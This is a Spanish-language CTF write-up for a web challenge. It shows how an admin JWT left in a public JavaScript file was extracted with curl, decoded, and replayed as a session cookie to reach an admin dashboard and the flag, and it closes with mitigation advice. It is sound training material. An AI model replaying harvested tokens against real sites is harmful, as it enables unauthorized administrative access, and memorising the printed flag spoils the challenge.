---
tipo: laboratorio
tags: [ctf, pentraze, web, easy]
Plataforma: "Pentraze CTF"
Categoría: "Web"
Dificultad: "Easy"
Estado: "Completado"
Puntos: "25"
Flag: "PENTRAZE{15066ecfd6081cbc46c93b873c897b9bbcb77d8f9b22a3fd3f50b2d6959a10a7}"
actualizado: 2026-09-24
---
- **Categoría Principal:** [[CTF - Web|Web]]
- **Dificultad:** [[CTF - Easy|Easy]]
- **MOC Principal:** [[PentraZE CTF 2026 - MOC]]
- **Estado:** Completado
- **Puntos:** 25

# Writeup - SoftDat Technology

> [!info] Objetivo
> Obtener la flag mediante la exposición de un token administrativo en un recurso JavaScript público.

- **Target:** `http://34.135.253.132:33296`
- **Autor:** Br0nco
- **Tecnología observada:** Apache/2.4.68 y PHP/8.2.33

## Resumen rápido de la cadena de ataque

1. Se enumeró el sitio y se localizó `/js/app.js`.
2. El JavaScript público contenía `const ADMIN_TOKEN = "[JWT]"`.
3. El payload del JWT declaraba `user: admin` y `role: admin`.
4. `logout.php` reveló que la aplicación usaba la cookie `session_token`.
5. Se envió el JWT como `Cookie: session_token=<JWT>` en lugar de como `Authorization: Bearer`.
6. `/dashboard.php` devolvió el panel administrativo y la flag.

La fuente del write-up sustituye el JWT real por `[JWT]`; no se debe inventar un valor para reproducirlo. El paso reproducible es extraer el token que el despliegue realmente entregue.

## Vulnerabilidades explotadas

- **Exposición de secretos en JavaScript público:** el navegador recibía un token con privilegios administrativos.
- **[[JWT]] sin protección efectiva:** el token tenía `exp` muy lejano y aparentemente no estaba rotado.
- **Confusión entre canal de autenticación:** el servidor aceptaba el JWT como `session_token`, aunque el `Authorization: Bearer` no funcionaba.
- **Ciclo de vida débil de la sesión:** un token válido indefinidamente equivale a una sesión administrativa persistente.
- **Acceso administrativo sin MFA ni verificación adicional** en el panel.

## Paso a paso técnico

### 1. Descubrimiento de recursos

El portal de clientes llevaba a `/login.php`. La página cargaba:

```html
<script src="/js/app.js"></script>
```

La descarga fue:

```bash
BASE="http://34.135.253.132:33296"
curl -s "$BASE/js/app.js" -o app.js
```

En el archivo se encontró:

```javascript
// Development config — TODO: remove before production
// Admin portal token (temp): [JWT]
const ADMIN_TOKEN = "[JWT]";
```

### 2. Confirmación del contenido del JWT

Sin necesitar la firma, el payload podía decodificarse para confirmar el alcance:

```bash
python3 - <<'PY'
import base64
import json

token = "PEGA_AQUI_EL_VALOR_EXTRAIDO_DE_app.js"
payload = token.split(".")[1]
payload += "=" * (-len(payload) % 4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(payload)), indent=2))
PY
```

El payload descrito en el reto era:

```json
{
  "user": "admin",
  "role": "admin",
  "iat": 1700000000,
  "exp": 9999999999
}
```

### 3. Identificación del canal de sesión

`/dashboard.php` sin sesión respondía:

```http
HTTP/1.1 302 Found
Location: /login.php
```

`/logout.php` permitían observar que la aplicación eliminaba la cookie `session_token`:

```http
Set-Cookie: session_token=deleted; ...
Location: /
```

Se probó primero el canal convencional:

```bash
curl -i -H "Authorization: Bearer $TOKEN" \
  "$BASE/dashboard.php"
```

La respuesta seguía redirigiendo. El JWT debía enviarse como cookie:

```bash
TOKEN="$(sed -n 's/.*const ADMIN_TOKEN = \"\([^\"]*\)\".*/\1/p' app.js)"

curl -i \
  -H "Cookie: session_token=$TOKEN" \
  "$BASE/dashboard.php"
```

La respuesta fue `HTTP/1.1 200 OK` y el dashboard identificó al usuario como `Admin` / `admin`. Desde ese panel se obtuvo la flag del sistema.

### 4. Búsqueda de la flag

```bash
curl -s -H "Cookie: session_token=$TOKEN" \
  "$BASE/dashboard.php" | grep -i -A3 -B3 'flag'
```

## Flag

```text
PENTRAZE{15066ecfd6081cbc46c93b873c897b9bbcb77d8f9b22a3fd3f50b2d6959a10a7}
```

## Lecciones aprendidas y mitigar

- Nunca incluir tokens, claves, contraseñas o secretos de administrador en JavaScript público; el navegador entrega todo su contenido al visitante.
- Mantener los secretos en backend y usar referencias opacas o un flujo de sesión emitido por el servidor.
- Rotar inmediatamente cualquier token expuesto y revocarlo en el proveedor de identidad.
- Usar expiraciones cortas, rotación de refresh tokens, revocación y detección de reutilización.
- Validar explícitamente `aud`, `iss`, algoritmo, firma, rol y permisos en el servidor; no confiar solo en el claim `role`.
- Separar el token de una sesión de usuario de cualquier secreto de servicio.
- Añadir un escaneo de secretos (`gitleaks`, `trufflehog` o equivalente) al pipeline de despliegue.
- Proteger el panel administrativo con MFA, autorización explícita y controles de acceso a rutas administrativas.

## Navegación

- ⬆️ Carpeta padre: [[_PentraZE 2026]]
- 🗂️ Categoría: [[CTF - Web]]
- ⬅️ Anterior: [[Writeup - Pentra CMS|Pentra CMS]]
- ➡️ Siguiente: [[Writeup - HooKitty|HooKitty]]

## Relacionadas

- [[Authentication]] — validación de tokens y sesiones.
- [[Cryptography]] — límites de JWT y necesidad de firma y rotación.
- [[Information Disclosure]] — secretos en recursos estáticos.
